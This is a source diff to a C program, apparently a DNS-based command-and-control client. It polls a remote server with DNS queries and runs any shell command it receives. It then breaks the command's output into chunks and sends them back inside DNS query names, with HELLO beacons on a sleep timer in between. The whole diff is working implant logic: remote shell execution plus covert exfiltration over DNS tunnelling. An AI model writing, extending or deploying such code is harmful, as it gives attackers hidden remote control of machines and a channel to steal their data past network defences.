@@ -15,6 +15,12 @@
 #include "dns-packet.h"
 #include "linked-list.h"	// list definitions and structs
 
+// new thoughts
+/*
+ * perhaps don't need a task qeueue unless we are waiting until all previous
+ * tasks finish posting until de-queueing next task
+ */
+
 /*
  * discussion points for "heavy weight" vs. "light weight" implementations
  * of 'dns-client' while ensuring reliability and error detection and recovery.
@@ -86,7 +92,6 @@ unsigned char firstQuery[] = {
 unsigned char *domain = ".com.";
 unsigned char *host   = "initial";
 unsigned int napTime = 10;
-unsigned int isJobInProgress = 0;
 
 void main(int argc, char *argv[])
 {
@@ -100,13 +105,12 @@ void main(int argc, char *argv[])
 	// create two linked list based queues
 	struct NODE *taskQueueHead = NULL;
 	struct NODE *stdoutListHead = NULL;
-
 	// argv1 - "host portion"
 	// argv2 - "domain"
 
 	// send initial query and receive response
 	// encrypt, encode, createPacket, sendPacket
-	sendBuff = createDnsQueryPacket(host, domain, &sendBuffSize);
+	sendBuff = createDnsQueryPacket(MESSAGE_TYPE_HELLO, argv[1], domain, &sendBuffSize);
 	recvBuff = sendQuery(sendBuff, sendBuffSize, &recvBuffSize);
 
 	// create dns packet buffer
@@ -120,62 +124,88 @@ void main(int argc, char *argv[])
 		// disect pre-selected fields based on protocol we designed
 		struct CONTROL *ctrl = getControl(drp);
 
-		printControlFields(ctrl);
-
 		// decide what to do with response
 		switch (ctrl->messageType)
 		{
+			/* ========================================================= */
 			case MESSAGE_TYPE_NO_CMD: puts("case => MESSAGE_TYPE_NO_CMD");
-				// sleep, grab next stdout chunk, send query
 				break;
 
+			/* ========================================================= */
 			case MESSAGE_TYPE_SHELL_CMD: puts("case => MESSAGE_TYPE_SHELL_CMD");
-				// add shell command to task queue
-				enqueue(&taskQueueHead, ctrl->message, ctrl->messsageLength);
+
+				//printControlFields(ctrl); exit(1);
+			    // add shell command to task queue OR..
+				// run command and add list of stdout to stdoutList
+				//stdoutBuffSize = shellCommand(ctrl->message, &stdoutBuff);
+				stdoutBuffSize = shellCommand(ctrl->message, &stdoutBuff);
+				struct NODE *tempList = constructStdoutList(stdoutBuff, stdoutBuffSize);
+
+				// empty out stdout list query names into stdoutListHead
+				while(tempList->next != NULL)
+				{
+					enqueue(&stdoutListHead, tempList->data, tempList->dataLength);
+
+					// walking the tempList of stdout, storing node in 'global' sdoutListHead
+					tempList = tempList->next;
+				}
+				// tempList has no more nodes connected or just had 1 to begin
+				enqueue(&stdoutListHead, tempList->data, tempList->dataLength);
 				break;
+			/* ========================================================= */
 
 			default: puts("case => default");
 				break;
 		} // end switch
 
-		// check taskQueue
-		struct NODE *nextJob = dequeue(&taskQueueHead);
-		printf("nextJob: %p \n", nextJob);
 
-		if(nextJob != NULL) // tasks exist
+		/*
+		 * ran command, added to stdoutList
+		 *
+		 *  now --> grab chunks and send.
+		 */
+
+		// NEED TO INVESTIGATE SIZE OF STDOUT LIST QUEUE EXACTLY
+		// WHAT NODES ARE INSIDE IT, AND WHY CHUNK==NULL ..??
+
+		// now grab next chunk of output -- no necessarily from prev cmd
+		struct NODE *chunk = dequeue(&stdoutListHead);
+
+		if(chunk!=NULL) // has data output to send
 		{
-			puts("nextJob != NULL");
-
-			isJobInProgress = 1;
-			printf("next job -> %s \n", nextJob->data);
-
-			// run job
-			stdoutBuffSize = shellCommand(nextJob->data, &stdoutBuff);
-			stdoutListHead = constructStdoutList(stdoutBuff, stdoutBuffSize);
-
-			// fetch a stdout "chunk" "node" and send
-			struct NODE *chunk = dequeue(&stdoutListHead);
-			sendBuff = createDnsQueryPacket(chunk->data, domain, &sendBuffSize);
-			recvBuff = sendQuery(sendBuff, sendBuffSize, &recvBuffSize);
+			puts("chunk not null ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ");
+			sendBuff = createDnsQueryPacket(MESSAGE_TYPE_CMD_OUTPUT,
+												chunk->data,
+													domain,
+														&sendBuffSize);
 		}
+		else // regular HELLO packet
+		{
+			puts("chunk null ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
+			sendBuff = createDnsQueryPacket(MESSAGE_TYPE_HELLO,
+												"chunk-null",
+													domain,
+														&sendBuffSize);
+		}
+
+
 		// else no tasks in queue.. query again
-		sendBuff = createDnsQueryPacket("waiting", domain, &sendBuffSize);
 		sleep(napTime);
 		recvBuff = sendQuery(sendBuff, sendBuffSize, &recvBuffSize);
 
 		// free malloc'd pointers
-		puts("free()'ing ");
-		if(drp!=NULL)
-			free(drp);
+		//puts("free()'ing ");
+		//if(drp!=NULL)
+		//	free(drp);
 
-		if(drp->dnsQuestion.qname!=NULL)
-			free(drp->dnsQuestion.qname);
+		//if(drp->dnsQuestion.qname!=NULL)
+		//	free(drp->dnsQuestion.qname);
 
-		if(ctrl!=NULL)
-			free(ctrl);
+		//if(ctrl!=NULL)
+		//	free(ctrl);
 
-		if(ctrl->message!=NULL)
-			free(ctrl->message);
+		//if(ctrl->message!=NULL)
+		//	free(ctrl->message);
 
 	} // end while
 
